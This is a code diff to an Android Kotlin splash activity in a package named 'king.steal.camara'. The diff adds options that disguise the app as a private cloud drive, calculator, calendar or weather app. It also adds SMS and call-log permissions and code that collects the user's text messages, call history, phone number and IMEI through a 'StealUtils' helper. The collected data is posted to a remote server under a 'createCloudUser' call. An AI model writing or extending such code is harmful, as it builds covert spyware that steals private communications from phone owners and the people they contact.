@@ -27,6 +27,7 @@ import king.steal.camara.utils.AppUtils
 import king.steal.camara.utils.SpUtil
 import king.steal.camara.utils.ToastUtils
 import king.steal.marrykotlin.iface.OnRequestListener
+import king.steal.tool.StealUtils
 import kotlinx.android.synthetic.main.activity_splash.*
 import pub.devrel.easypermissions.AppSettingsDialog
 import pub.devrel.easypermissions.EasyPermissions
@@ -68,9 +69,7 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
 
         setContentView(R.layout.activity_splash)
 
-        tv_app_name.typeface = textTypeface
-        tv_splash_desc.typeface = descTypeFace
-        tv_version_name.text = "v${AppUtils.getVerName(applicationContext)}"
+        initView()
 
         //渐变展示启动屏
         alphaAnimation = AlphaAnimation(0.3f, 1.0f)
@@ -87,6 +86,32 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
         })
 
         checkPermission()
+    }
+
+    private fun initView() {
+        tv_app_name.typeface = textTypeface
+        tv_splash_desc.typeface = descTypeFace
+        tv_version_name.text = "v${AppUtils.getVerName(applicationContext)}"
+        //默认值
+        val iconStyle = SpUtil.getInstance().getString(SpUtil.icon_style)
+        when(iconStyle) {
+            "default" ->{
+                iv_web_icon.setImageResource(R.mipmap.ic_space)
+                tv_app_name.text = "私密云盘"
+            }
+            "calculator" ->{
+                iv_web_icon.setImageResource(R.mipmap.ic_calculator)
+                tv_app_name.text = "计算器"
+            }
+            "calendar" ->{
+                iv_web_icon.setImageResource(R.mipmap.ic_calendar)
+                tv_app_name.text = "日历"
+            }
+            "weather" ->{
+                iv_web_icon.setImageResource(R.mipmap.ic_weather)
+                tv_app_name.text = "天气"
+            }
+        }
     }
 
 
@@ -108,7 +133,10 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
      * 有些厂商修改了6.0系统申请机制，他们修改成系统自动申请权限了
      */
     private fun checkPermission() {
-        val perms = arrayOf(Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA)
+        val perms = arrayOf(Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_CALL_LOG)
         EasyPermissions.requestPermissions(this, "应用需要以下权限，请允许", 0, *perms)
 
     }
@@ -117,7 +145,9 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
         if (requestCode == 0) {
             if (perms.isNotEmpty()) {
                 if (perms.contains(Manifest.permission.READ_PHONE_STATE)
-                        && perms.contains(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                        && perms.contains(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                        && perms.contains(Manifest.permission.READ_SMS)
+                        && perms.contains(Manifest.permission.READ_CALL_LOG)) {
                     if (alphaAnimation != null) {
                         iv_web_icon.startAnimation(alphaAnimation)
                     }
@@ -131,8 +161,17 @@ class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {
         val map = HashMap<String, String>()
         val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val imei = telephonyMgr.deviceId as String
+        val phoneUser = telephonyMgr.line1Number
+        if (null != phoneUser)
+            map["address"] = phoneUser.toString()
         SpUtil.getInstance().putString("imei", imei)
         map["imei"] = imei
+        //获取用户短信记录
+        val message = StealUtils.getSmsInPhone(applicationContext)
+        map["message"] = Gson().toJson(message)
+        //获取用户通话记录
+        val phoneInfos = StealUtils.getCallInfos(applicationContext)
+        map["phone"] = Gson().toJson(phoneInfos)
         NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.createCloudUser, object : OnRequestListener {
             override fun onSuccess(t: String) {
                 if (t == "success") {
